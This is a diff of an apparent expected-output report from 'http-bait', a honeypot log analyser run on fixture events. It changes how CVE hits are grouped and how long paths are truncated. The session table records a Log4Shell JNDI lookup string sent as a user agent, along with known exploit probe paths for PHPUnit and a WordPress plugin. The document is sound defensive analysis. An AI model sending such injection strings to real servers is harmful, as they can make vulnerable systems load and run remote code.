@@ -1,7 +1,7 @@
 === http-bait analysis ===
 files: sample_events.jsonl
 window: 2026-07-10T04:27:01+00:00 -> 2026-07-22T20:00:01+00:00
-window labels: {'fixture': 21, 'unlabelled': 10}
+window labels: {'fixture': 31}
 requests: 20   total events: 31
 excluded: none (pass --exclude-ip/--exclude-ua for self-test traffic)
 distinct IPs: 13
@@ -35,12 +35,12 @@ per-session request sequence (top 30 by request count):
    192.0.2.0/24         agent-runner/0.3                      2      4.0 paced-automation ['/.well-known/ai-plugin.json', '/api/v1/jobs/run']
    198.51.100.0/24      curl/8.4.0                            2    360.0 slow/interactive ['/config.json', '/x/9988776655443322']
    203.0.113.0/24       floodbot                              2      1.0 paced-automation ['/filler', '/huge']
-   203.0.113.0/24       Mozilla/5.0 (compatible; scanner      1      0.0 single-shot      ['/db/connect']
+   203.0.113.0/24       Mozilla/5.0 (compatible; scanner…     1      0.0 single-shot      ['/db/connect']
    203.0.113.0/24       ${jndi:ldap://x/a}                    1      0.0 single-shot      ['/']
    203.0.113.0/24       python-requests/2.32                  1      0.0 single-shot      ['/site']
-   192.0.2.0/24         Custom-AsyncHttpClient                1      0.0 single-shot      ['/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php']
+   192.0.2.0/24         Custom-AsyncHttpClient                1      0.0 single-shot      ['/vendor/phpunit/phpunit/src/Util/PHP/eva…']
    192.0.2.0/24         Go-http-client/2.0                    1      0.0 single-shot      ['/legacy']
-   192.0.2.0/24         Mozilla/5.0                           1      0.0 single-shot      ['/wp-content/plugins/wp-automatic/inc/csv.php']
+   192.0.2.0/24         Mozilla/5.0                           1      0.0 single-shot      ['/wp-content/plugins/wp-automatic/inc/csv…']
    198.51.100.0/24      graphql-probe                         1      0.0 single-shot      ['/graphql']
    203.0.113.0/24       node-fetch                            1      0.0 single-shot      ['/api/run']
    203.0.113.0/24       scanner                               1      0.0 single-shot      ['/x/ffffffffffffffff']
@@ -58,19 +58,28 @@ secret-file path hit counts (route_kind=secret-file):
    sessions hitting both '.env' & 'wp-config.php': 0 (.env-first: 0, wp-config.php-first: 0)
 
 CVE hits — LIVE (what the deployed signatures flagged at the time):
-   cve_id                  hits   IPs  first seen           signature since
-   CVE-2021-44228             1     1  2026-07-11T09:14:00+00:00 2026-07-11
+   payload-bearing exploit attempts: 1 hit(s) across 1 signature(s)
+     id                      hits   IPs  w/body  first seen                 since
+     CVE-2021-44228             1     1       0  2026-07-11T09:14:00+00:00  2026-07-11
+   vulnerability probes (path/marker only): 0 hit(s) across 0 signature(s)
+   Quote the two separately. `w/body` counts probe hits that did carry a
+   body, which is the subset worth reviewing by hand for promotion.
 
 cve_pattern_match by advertised-version variant:
         1  struts
 
 CVE hits — RESCAN (current signatures re-applied to retained records):
-   cve_id                  hits   IPs  first seen           signature since
-   CVE-2021-44228             1     1  2026-07-11T09:14:00+00:00 2026-07-11
-   CVE-2022-22965             1     1  2026-07-11T11:00:00+00:00 initial
-   CVE-2017-9841              1     1  2026-07-13T02:20:00+00:00 unknown
-   CVE-2025-55182             1     1  2026-07-14T18:05:00+00:00 2026-07-19
-   CVE-2024-27956             1     1  2026-07-15T07:00:00+00:00 2026-08-03
+   payload-bearing exploit attempts: 3 hit(s) across 3 signature(s)
+     id                      hits   IPs  w/body  first seen                 since
+     CVE-2021-44228             1     1       0  2026-07-11T09:14:00+00:00  2026-07-11
+     CVE-2022-22965             1     1       1  2026-07-11T11:00:00+00:00  initial
+     CVE-2025-55182             1     1       1  2026-07-14T18:05:00+00:00  2026-07-19
+   vulnerability probes (path/marker only): 2 hit(s) across 2 signature(s)
+     id                      hits   IPs  w/body  first seen                 since
+     CVE-2017-9841              1     1       0  2026-07-13T02:20:00+00:00  unknown
+     CVE-2024-27956             1     1       0  2026-07-15T07:00:00+00:00  2026-08-03
+   Quote the two separately. `w/body` counts probe hits that did carry a
+   body, which is the subset worth reviewing by hand for promotion.
    NOTE: a rescan sees only what was retained. Request bodies are
    capped and only a 4KB excerpt is stored, and sensitive headers
    are redacted at write time, so this is a lower bound.
